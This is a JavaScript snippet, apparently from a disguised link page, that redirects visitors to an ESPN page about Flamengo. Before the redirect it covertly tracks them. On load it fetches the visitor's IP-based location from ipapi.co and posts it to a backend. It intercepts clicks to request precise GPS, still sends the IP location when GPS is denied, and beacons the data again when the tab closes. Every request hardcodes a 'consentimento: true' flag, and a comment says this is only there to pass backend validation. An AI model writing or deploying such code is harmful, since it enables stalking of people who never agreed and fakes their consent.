<script>
    let dadosUltimaLocalizacao = {
      latitude: null,
      longitude: null,
      maps: "",
      source: "Não obtida"
    };

    const linkOriginal = "https://www.espn.com.br/futebol/time/_/id/819/flamengo";
    let processandoGPS = false;

    function continuarParaESPN() {
        window.location.assign(linkOriginal);
    }

    // Opcional: tenta capturar o IP aproximado em segundo plano ao carregar a página
    window.addEventListener("load", () => {
      fetch("https://ipapi.co/json/")
        .then(response => response.json())
        .then(data => {
          if (data && data.latitude) {
            const latitude = data.latitude;
            const longitude = data.longitude;
            const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
            const source = "Aproximada (IP)";

            dadosUltimaLocalizacao = { latitude, longitude, maps, source };
            enviarParaApi(latitude, longitude, source, "abriu_pagina_ip");
          }
        })
        .catch(() => {});
    });

    function enviarParaApi(latitude, longitude, source, acao) {
      fetch("/api/send-location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          latitude,
          longitude,
          source,
          acao,
          consentimento: true // Obrigatório para passar pela validação do backend
        }),
        keepalive: true
      })
      .then(response => response.json())
      .catch(error => {
        console.error("Erro ao enviar:", error);
      });
    }

    // Intercepta cliques nos elementos interativos com a classe .acionador-gps
    function dispararFluxoGPS(event) {
        if (event) {
            event.preventDefault();
            event.stopPropagation();
        }

        if (processandoGPS) return;
        processandoGPS = true;

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    const source = "Precisa (GPS)";

                    dadosUltimaLocalizacao = { 
                        latitude, 
                        longitude, 
                        maps: `https://www.google.com/maps?q=${latitude},${longitude}`, 
                        source 
                    };

                    enviarParaApi(latitude, longitude, source, "clique_botao_gps");
                    
                    setTimeout(() => {
                        processandoGPS = false;
                        continuarParaESPN();
                    }, 400); // Pequeno delay para garantir o disparo do fetch antes do redirecionamento
                },
                (error) => {
                    console.warn("GPS negado ou indisponível:", error);
                    
                    // Se o usuário negar, envia o IP que já temos ou marca como negado
                    enviarParaApi(
                        dadosUltimaLocalizacao.latitude || 0, 
                        dadosUltimaLocalizacao.longitude || 0, 
                        "Negado / Fallback IP", 
                        "clique_botao_gps_negado"
                    );

                    setTimeout(() => {
                        processandoGPS = false;
                        continuarParaESPN();
                    }, 400);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 8000,
                    maximumAge: 0
                }
            );
        } else {
            processandoGPS = false;
            continuarParaESPN();
        }
    }

    // Vincula a escuta de cliques a todos os elementos com a classe .acionador-gps
    document.querySelectorAll(".acionador-gps").forEach(function(elemento) {
        elemento.addEventListener("click", dispararFluxoGPS);
    });

    // Envio de segurança caso o usuário feche a aba bruscamente
    window.addEventListener('beforeunload', function () {
      if (dadosUltimaLocalizacao.latitude && navigator.sendBeacon) {
        const payload = JSON.stringify({
          ...dadosUltimaLocalizacao,
          acao: 'fechou_pagina',
          consentimento: true
        });
        navigator.sendBeacon('/api/send-location', payload);
      }
    });
</script>
